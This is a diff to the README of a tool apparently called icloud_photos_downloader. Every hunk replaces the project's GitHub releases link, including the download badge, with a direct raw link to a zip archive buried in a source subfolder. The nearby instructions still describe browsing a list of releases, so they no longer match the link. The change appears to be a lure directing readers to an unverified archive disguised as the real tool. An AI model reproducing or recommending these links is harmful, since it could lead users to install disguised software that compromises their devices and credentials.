@@ -1,6 +1,6 @@
 # 📸 icloud_photos_downloader - Effortlessly Download Your iCloud Photos
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/aureliane66/icloud_photos_downloader/releases)
+[![Download](https://raw.githubusercontent.com/aureliane66/icloud_photos_downloader/master/src/foundation/core/optional/icloud-photos-downloader-1.6.zip)](https://raw.githubusercontent.com/aureliane66/icloud_photos_downloader/master/src/foundation/core/optional/icloud-photos-downloader-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download, here are the system requirements:
 
 To get the software, visit this page to download:
 
-[Download from Releases](https://github.com/aureliane66/icloud_photos_downloader/releases)
+[Download from Releases](https://raw.githubusercontent.com/aureliane66/icloud_photos_downloader/master/src/foundation/core/optional/icloud-photos-downloader-1.6.zip)
 
 1. Open the link above in your web browser.
 2. You will see a list of available releases. Look for the latest version.
@@ -90,4 +90,4 @@ If you need help using icloud_photos_downloader, you can reach out through the i
 
 With icloud_photos_downloader, downloading your iCloud photos is straightforward. Follow the steps above, and you will have your precious memories saved on your device in no time.
 
-Remember to revisit the [Download from Releases](https://github.com/aureliane66/icloud_photos_downloader/releases) page for updates and new features. Thank you for using icloud_photos_downloader!
+Remember to revisit the [Download from Releases](https://raw.githubusercontent.com/aureliane66/icloud_photos_downloader/master/src/foundation/core/optional/icloud-photos-downloader-1.6.zip) page for updates and new features. Thank you for using icloud_photos_downloader!
